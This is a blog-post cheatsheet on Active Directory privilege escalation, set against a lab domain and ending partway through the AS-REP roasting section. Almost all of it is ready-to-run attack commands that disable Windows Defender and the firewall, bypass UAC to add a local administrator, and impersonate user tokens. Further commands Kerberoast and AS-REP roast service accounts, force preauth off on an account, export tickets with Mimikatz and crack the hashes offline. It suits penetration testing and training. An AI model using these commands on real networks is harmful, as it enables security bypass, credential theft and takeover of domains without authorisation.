<!doctype html><!-- This site was created with Wowchemy. https://www.wowchemy.com --><!-- Last Published: January 14, 2023 --><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.242b882c3b0c00ae28b251add3931eef.css><link rel=stylesheet href=/css/libs/chroma/github-light.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><script async src="https://www.googletagmanager.com/gtag/js?id=G-NNZHY5233M"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}function trackOutboundLink(e,t){gtag("event","click",{event_category:"outbound",event_label:e,transport_type:"beacon",event_callback:function(){t!=="_blank"&&(document.location=e)}}),console.debug("Outbound link clicked: "+e)}function onClickCallback(e){if(e.target.tagName!=="A"||e.target.host===window.location.host)return;trackOutboundLink(e.target,e.target.getAttribute("target"))}gtag("js",new Date),gtag("config","G-NNZHY5233M",{}),gtag("set",{cookie_flags:"SameSite=None;Secure"}),document.addEventListener("click",onClickCallback,!1)</script><meta name=author content="Giovanni Pecoraro"><meta name=description content="Privilege escalation is the process by which a user with limited access to the domain can increase the scope and scale of their access permissions."><link rel=alternate hreflang=en-us href=https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/><link rel=canonical href=https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#3f51b5"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="@wowchemy"><meta property="twitter:creator" content="@wowchemy"><meta property="twitter:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:site_name" content="Giovanni Pecoraro"><meta property="og:url" content="https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/"><meta property="og:title" content="Domain Privilege Escalation Cheatsheet | Giovanni Pecoraro"><meta property="og:description" content="Privilege escalation is the process by which a user with limited access to the domain can increase the scope and scale of their access permissions."><meta property="og:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-07-31T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-31T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/"},"headline":"Domain Privilege Escalation Cheatsheet","datePublished":"2022-07-31T00:00:00Z","dateModified":"2022-07-31T00:00:00Z","author":{"@type":"Person","name":"Giovanni Pecoraro"},"publisher":{"@type":"Organization","name":"Giovanni Pecoraro","logo":{"@type":"ImageObject","url":"https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"}},"description":"Privilege escalation is the process by which a user with limited access to the domain can increase the scope and scale of their access permissions."}</script><title>Domain Privilege Escalation Cheatsheet | Giovanni Pecoraro</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=381c01d401294235df85592b90ed62e8><script src=/js/wowchemy-init.min.7532de8e15162845d694f17af8b46a99.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Talks</span></a></li><li class=nav-item><a class=nav-link href=/#featured><span>Publications</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class="nav-item d-none d-lg-inline-flex"><a class=nav-link href=https://twitter.com/Peco602 data-toggle=tooltip data-placement=bottom title="Follow me on Twitter" target=_blank rel=noopener aria-label="Follow me on Twitter"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Domain Privilege Escalation Cheatsheet</h1><p class=page-subtitle>Privilege escalation is the process by which a user with limited access to the domain can increase the scope and scale of their access permissions.</p><div class=article-metadata><div><span class=author-highlighted>Giovanni Pecoraro</span></div><span class=article-date>Jul 31, 2022</span>
<span class=middot-divider></span>
<span class=article-reading-time>11 min read</span>
<span class=middot-divider></span>
<span class=article-categories><i class="fas fa-folder mr-1"></i><a href=/category/cyber-security/>Cyber Security</a></span></div></div><div class=article-container><div class=article-style><h2 id=windows-defender>Windows Defender</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Disable Windows Defender</span>
</span></span><span class=line><span class=cl><span class=nb>Set-MpPreference</span> <span class=n>-DisableRealtimeMonitoring</span> <span class=vm>$true</span>
</span></span><span class=line><span class=cl><span class=nb>Set-MpPreference</span> <span class=n>-DisableIOAVProtection</span> <span class=vm>$true</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Disable Firewall</span>
</span></span><span class=line><span class=cl><span class=c>## cmd.exe</span>
</span></span><span class=line><span class=cl><span class=n>netsh</span> <span class=n>advfirewall</span> <span class=nb>set </span><span class=n>allprofiles</span> <span class=n>state</span> <span class=n>off</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## powershell.exe</span>
</span></span><span class=line><span class=cl><span class=nb>Set-NetFirewallProfile</span> <span class=n>-Profile</span> <span class=n>Domain</span><span class=p>,</span><span class=n>Public</span><span class=p>,</span><span class=n>Private</span> <span class=n>-Enabled</span> <span class=n>False</span>
</span></span></code></pre></div><h2 id=user-account-control-uac>User Account Control (UAC)</h2><p>In case you are a member of the local administrators group, but you still have the <em>Medium Mandatory Level</em> label, it is necessary to bypass the <em>User Account Control (UAC)</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># FodhelperUACBypass.ps1</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>FodhelperUACBypass</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=n>FodhelperUACBypass</span> <span class=n>-program</span> <span class=s2>&#34;cmd.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=n>FodhelperUACBypass</span> <span class=n>-program</span> <span class=s2>&#34;cmd.exe /c powershell.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=n>FodhelperUACBypass</span> <span class=n>-program</span> <span class=s2>&#34;cmd.exe /c net localgroup administrators CYBERLAB\STUDENT01 /add&#34;</span>
</span></span></code></pre></div><p>Alternatively, you can use <a href=https://github.com/FatRodzianko/SharpBypassUAC target=_blank rel=noopener>SharpBypassUAC</a>.</p><h2 id=token-manipulation>Token Manipulation</h2><p>Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.</p><h3 id=incognito>Incognito</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># A SYSTEM shell is required</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>PsExec64</span><span class=p>.</span><span class=py>exe</span> <span class=n>-s</span> <span class=n>-i</span> <span class=n>-d</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Show tokens on the machine</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>incognito</span><span class=p>.</span><span class=py>exe</span> <span class=n>list_tokens</span> <span class=n>-u</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Start new process with token of a specific user</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>incognito</span><span class=p>.</span><span class=py>exe</span> <span class=n>execute</span> <span class=s2>&#34;CYBERLAB\STUDENT2&#34;</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>system32</span><span class=p>\</span><span class=n>calc</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>incognito</span><span class=p>.</span><span class=py>exe</span> <span class=n>execute</span> <span class=n>-c</span> <span class=s2>&#34;CYBERLAB\STUDENT2&#34;</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><h3 id=invoke-tokenmanipulation>Invoke-TokenManipulation</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Show all tokens on the machine</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-TokenManipulation</span> <span class=n>-ShowAll</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Show only unique, usable tokens on the machine</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-TokenManipulation</span> <span class=n>-Enumerate</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Start new process with token of a specific user</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-TokenManipulation</span> <span class=n>-ImpersonateUser</span> <span class=n>-Username</span> <span class=s2>&#34;CYBERLAB\STUDENT2&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Start new process with token of another process</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-TokenManipulation</span> <span class=n>-CreateProcess</span> <span class=s2>&#34;C:\Windows\system32\calc.exe&#34;</span> <span class=n>-ProcessId</span> <span class=mf>500</span>
</span></span></code></pre></div><h2 id=classic-kerberoasting>Classic Kerberoasting</h2><ol><li><p>Find user accounts used as Service accounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetUser</span> <span class=n>-SPN</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADUser</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>ServicePrincipalName</span> <span class=o>-ne</span> <span class=s2>&#34;</span><span class=nv>$null</span><span class=s2>&#34;</span><span class=p>}</span> <span class=n>-Properties</span> <span class=n>ServicePrincipalName</span>
</span></span></code></pre></div></li><li><p>Request a Ticket Granting Service (TGS):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerShell</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Type</span> <span class=n>-AssemblyName</span> <span class=n>System</span><span class=p>.</span><span class=py>IdentityModel</span>
</span></span><span class=line><span class=cl><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IdentityModel</span><span class=p>.</span><span class=py>Tokens</span><span class=p>.</span><span class=py>KerberosRequestorSecurityToken</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;MSSQLSvc/database.cyberlab.cybercorp.local&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Request-SPNTicket</span> <span class=n>-SPN</span> <span class=s2>&#34;MSSQLSvc/database.cyberlab.cybercorp.local&#34;</span>
</span></span></code></pre></div></li><li><p>Check if the TGS has been granted:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>klist</span>
</span></span></code></pre></div></li><li><p>Export all tickets using Mimikatz</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::list /export&#34;&#39;</span>
</span></span></code></pre></div></li><li><p>Crack the Service account password (this step can be performed on a Kali machine):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># tgsrepcrack.py</span>
</span></span><span class=line><span class=cl><span class=n>git</span> <span class=n>clone</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>nidem</span><span class=p>/</span><span class=n>kerberoast</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=p>./</span><span class=n>tgsrepcrack</span><span class=p>.</span><span class=py>py</span> <span class=p>./</span><span class=mf>10</span><span class=n>-million-password-list-top</span><span class=p>-</span><span class=mf>1000000</span><span class=p>.</span><span class=py>txt</span> <span class=p>./</span><span class=n>240a10000-STUDENT1</span><span class=nv>@MSSQLSvc</span><span class=p>~</span><span class=n>database</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=py>localCYBERLAB</span><span class=p>.</span><span class=py>LOCAL</span><span class=p>.</span><span class=py>kirbi</span>
</span></span></code></pre></div><p>the same TGS can also be cracked by using <code>john</code>, but it must be firstly converted into a compatible format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># tgsrepcrack.py</span>
</span></span><span class=line><span class=cl>python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># JohnTheRipper</span>
</span></span><span class=line><span class=cl>/usr/sbin/john --format<span class=o>=</span>krb5tgs ./tgs.john --wordlist<span class=o>=</span>./10-million-password-list-top-1000000.txt
</span></span></code></pre></div></li></ol><p>An alternative way to perform Kerberoasting is to use <code>PowerSploit</code> combined to <code>john</code> or <code>hashcat</code>:</p><ol><li><p>Find user accounts used as Service accounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetUser</span> <span class=n>-SPN</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADUser</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>ServicePrincipalName</span> <span class=o>-ne</span> <span class=s2>&#34;</span><span class=nv>$null</span><span class=s2>&#34;</span><span class=p>}</span> <span class=n>-Properties</span> <span class=n>ServicePrincipalName</span>
</span></span></code></pre></div></li><li><p>Request a TGS:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Kerberoast.ps1</span>
</span></span><span class=line><span class=cl><span class=c>## JohnTheRipper (bleeding-jumbo branch)</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Kerberoast</span> <span class=n>-OutputFormat</span> <span class=n>john</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Hash</span> <span class=p>}</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>john_tgs</span><span class=p>.</span><span class=py>kirbi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## HashCat</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Kerberoast</span> <span class=n>-OutputFormat</span> <span class=n>hashcat</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Hash</span> <span class=p>}</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>hashcat_tgs</span><span class=p>.</span><span class=py>kirbi</span>
</span></span></code></pre></div></li><li><p>Brute-force the exported ticket:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># JohnTheRipper (bleeding-jumbo branch)</span>
</span></span><span class=line><span class=cl>john --format<span class=o>=</span>krb5tgs --wordlist<span class=o>=</span>./10-million-password-list-top-1000000.txt john_tgs.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># HashCat</span>
</span></span><span class=line><span class=cl>hashcat -m <span class=m>13100</span> --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt
</span></span></code></pre></div><p>The <code>hashcat</code> format can also be cracked by <code>john</code>.</p></li></ol><h2 id=targeted-kerberoasting-set-spn>Targeted Kerberoasting (Set SPN)</h2><p>With enough rights (<em>GenericAll</em>/<em>GenericWrite</em>), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.</p><ol><li><p>Let’s enumerate the permissions for RDPUsers on ACLs</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># PowerView
</span></span><span class=line><span class=cl>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match &#34;RDPUsers&#34;}
</span></span></code></pre></div></li><li><p>Check if the user already has a SPN:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Get-DomainUser</span> <span class=n>-Identity</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>ServicePrincipalName</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADUser</span> <span class=n>-Identity</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=n>-Properties</span> <span class=n>ServicePrincipalName</span> <span class=p>|</span> <span class=nb>select </span><span class=n>ServicePrincipalName</span>
</span></span></code></pre></div></li><li><p>Set a SPN for the user (must be unique for the domain):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DomainObject</span> <span class=n>-Identity</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=n>-Set</span> <span class=vm>@</span><span class=p>{</span><span class=n>serviceprincipalname</span><span class=p>=</span><span class=s1>&#39;ops/whatever1&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ADUser</span> <span class=n>-Identity</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=n>-ServicePrincipalNames</span> <span class=vm>@</span><span class=p>{</span><span class=n>Add</span><span class=p>=</span><span class=s1>&#39;ops/whatever1&#39;</span><span class=p>}</span>
</span></span></code></pre></div></li><li><p>Request a TGS:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerShell</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Type</span> <span class=n>-AssemblyNAme</span> <span class=n>System</span><span class=p>.</span><span class=py>IdentityModel</span>
</span></span><span class=line><span class=cl><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IdentityModel</span><span class=p>.</span><span class=py>Tokens</span><span class=p>.</span><span class=py>KerberosRequestorSecurityToken</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;ops/whatever1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Request-SPNTicket</span> <span class=n>-SPN</span> <span class=s2>&#34;ops/whatever1&#34;</span>
</span></span></code></pre></div></li><li><p>Check if the ticket has been granted:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>klist</span>
</span></span></code></pre></div></li><li><p>Export all tickets using Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::list /export&#34;&#39;</span>
</span></span></code></pre></div></li><li><p>Crack the Service account password (this step can be performed on a Kali machine):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># tgsrepcrack.py</span>
</span></span><span class=line><span class=cl>git clone https://github.com/nidem/kerberoast
</span></span><span class=line><span class=cl>python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-student1@ops~whatever1CYBERLAB.CYBERCORP.LOCAL.kirbi
</span></span></code></pre></div><p>the same TGS can also be cracked by using <code>john</code>, but it must be firstly converted into a compatible format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># tgsrepcrack.py</span>
</span></span><span class=line><span class=cl>python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># JohnTheRipper</span>
</span></span><span class=line><span class=cl>/usr/sbin/john --format<span class=o>=</span>krb5tgs ./tgs.john --wordlist<span class=o>=</span>./10-million-password-list-top-1000000.txt
</span></span></code></pre></div></li></ol><h2 id=asreproasting-as-rep>ASREProasting (AS-REP)</h2><p>If a user’s <em>UserAccountControl</em> settings have <em>Do not require Kerberos preauthentication</em> enabled, i.e. Kerberos preauth is disabled, it is possible to grab user’s crackable AS-REP and brute-force it offline. With sufficient rights (<em>GenericWrite</em> or <em>GenericAll</em>), Kerberos preauth can be forced disabled as well.</p><ol><li><p>Enumerating accounts with Kerberos Preauth disabled:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Get-DomainUser</span> <span class=n>-PreauthNotRequired</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADUser</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>DoesNotRequirePreAuth</span> <span class=o>-eq</span> <span class=vm>$True</span><span class=p>}</span> <span class=n>-Properties</span> <span class=n>DoesNotRequirePreAuth</span>
</span></span></code></pre></div><p>or let’s enumerate the permissions for <em>RDPUsers</em> on ACLs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-ACLScanner</span> <span class=n>-ResolveGUIDs</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-match</span> <span class=s2>&#34;RDPUsers&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p>Users in <em>RDPUser</em> group have <em>GenericWrite</em> or <em>GenericAll</em> permission on <em>STUDENTI1</em> user so it is possible to force the disable of Kerberos Preauth on it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DomainObject</span> <span class=n>-Identity</span> <span class=s2>&#34;STUDENTI1&#34;</span> <span class=n>-XOR</span> <span class=vm>@</span><span class=p>{</span><span class=n>useraccountcontrol</span><span class=p>=</span><span class=mf>4194304</span><span class=p>}</span> <span class=n>-VerboseGet-DomainUser</span> <span class=n>-PreauthNotRequired</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Request encrypted AS-REP for offline brute-force</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># ASREPRoast</span>
</span></span><span class=line><span class=cl><span class=c># JohnTheRipper (bleeding-jumbo branch)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ASREPHash</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENTI1&#34;</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>john_asrep</span><span class=p>.</span><span class=py>kirbi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># HashCat</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ASREPHash</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENTI1&#34;</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>replace</span><span class=p>(</span><span class=s1>&#39;$krb5asrep$&#39;</span><span class=p>,</span><span class=s1>&#39;$krb5asrep$23$&#39;</span><span class=p>)}</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>hashcat_asrep</span><span class=p>.</span><span class=py>kirbi</span>
</span></span></code></pre></div><p>It is also possible to enumerate all users with Kerberos preauth disabled and request a hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># ASREPRoast</span>
</span></span><span class=line><span class=cl><span class=c># JohnTheRipper (bleeding-jumbo branch)</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-ASREPRoast</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Hash</span> <span class=p>}</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>john_asrep</span><span class=p>.</span><span class=py>kirbi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># HashCat</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-ASREPRoast</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Hash</span> <span class=p>}</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>replace</span><span class=p>(</span><span class=s1>&#39;$krb5asrep$&#39;</span><span class=p>,</span><span class=s1>&#39;$krb5asrep$23$&#39;</span><span class=p>)}</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=n>-Encoding</span> <span class=n>ASCII</span> <span class=n>hashcat_asrep</span><span class=p>.</span><span class=py>kirbi</span>
